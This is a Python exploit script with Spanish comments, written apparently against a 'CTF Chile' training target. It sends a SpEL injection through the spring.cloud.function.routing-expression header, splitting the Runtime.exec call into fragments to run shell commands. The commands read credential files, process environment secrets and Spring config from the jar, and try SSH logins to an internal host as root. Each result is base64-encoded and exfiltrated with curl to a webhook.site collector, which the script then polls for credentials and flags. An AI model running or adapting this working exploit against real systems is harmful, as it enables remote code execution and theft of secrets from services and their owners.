#!/usr/bin/env python3
"""
CTF Chile - Examinar archivos específicos de credenciales
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Examinando archivos específicos de credenciales...")

# Examinar archivos que podrían tener credenciales
probe("debconf_passwords", "cat /var/cache/debconf/passwords.dat 2>/dev/null | head -10")
probe("jmx_password_template", "cat /opt/java/openjdk/conf/management/jmxremote.password.template")
probe("java_security", "cat /opt/java/openjdk/conf/security/java.security | grep -i password | head -5")

print("[*] Buscando archivos de configuración específicos de Spring...")

# Buscar configuración de Spring que podría tener credenciales
probe("spring_boot_config", "cd /tmp && unzip -p /app/app.jar application.properties application.yml bootstrap.properties 2>/dev/null")
probe("spring_security_config", "cd /tmp && unzip -l /app/app.jar | grep -i security")

print("[*] Verificando archivos de entorno y configuración del sistema...")

# Verificar variables de entorno del proceso Java
probe("java_process_env", "cat /proc/1/environ | tr '\\0' '\\n' | grep -i -E '(ssh|password|key|secret|flag|user)' | head -10")

print("[*] Buscando información específica del usuario root en el host objetivo...")

# Probar diferentes métodos de enumeración del host objetivo
probe("ssh_version_check", "timeout 3 ssh -V 2>&1")
probe("openssh_config", "cat /etc/ssh/ssh_config 2>/dev/null | grep -v '^#' | grep -v '^$'")

print("[*] Intentando métodos de autenticación SSH alternativos...")

# Probar autenticación por clave sin contraseña
probe("ssh_no_password", "timeout 5 ssh -o PasswordAuthentication=no -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@10.160.209.1 'echo NO_PASSWORD_SUCCESS' 2>/dev/null || echo 'NO_PASSWORD_FAILED'")

# Probar usuarios alternativos
probe("ssh_ubuntu_user", "timeout 5 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 ubuntu@10.160.209.1 'echo UBUNTU_SUCCESS' 2>/dev/null || echo 'UBUNTU_FAILED'")

time.sleep(12)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=20", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar información útil de SSH
            if any(keyword in decoded.lower() for keyword in ["password", "key", "ssh", "login", "auth"]):
                print("🔑 INFORMACIÓN DE AUTENTICACIÓN DETECTADA")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")

        except Exception as e:
            print(f"(decode error) {raw[:150]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")